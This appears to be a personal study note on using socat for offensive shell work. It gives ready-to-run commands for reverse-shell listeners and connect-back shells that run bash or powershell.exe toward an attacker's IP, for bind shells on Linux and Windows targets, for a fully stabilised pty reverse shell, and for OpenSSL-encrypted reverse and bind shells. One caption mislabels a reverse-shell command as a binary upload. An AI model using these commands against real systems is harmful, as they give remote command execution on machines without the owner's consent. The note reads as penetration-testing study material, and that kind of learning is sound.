similar to [[Netcat]] but with more robust features

## Basic [[Reverse Shell]] Listener:

```bash
socat TCP-L:<port> -
```
equivalent to `nc -lvnp PORT_NUMBER`

On windows, we will run:
```powershell
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
to connect back

Linux equivalent:
```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

## Setting up a [[Bind Shell]]:

Run the following on a linux target:
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```

Windows equivalent:
```powershell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Run this command on our system:
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

## Stabilising a [[Shell]]:

This command initiates a stable shell session
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

This command uploads a precompiled `socat` binary to the target machine:
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

![[Pasted image 20260506095748.png]]

## How to encrypt [[Shell]] sessions in `socat`

1. Generate certificate on the attacking machine - `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`. This command creates a 2048 bit [[RSA]] key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
2. Merge the two created files into a single `.pem` file - `cat shell.key shell.crt > shell.pem`
3. Set up [[Reverse Shell]] listener - `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` 
4. Connect back using `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
5. For [[Bind Shell]] -
	1. Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
	2. Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

![[Pasted image 20260507091407.png]]

![[Pasted image 20260507092426.png]]

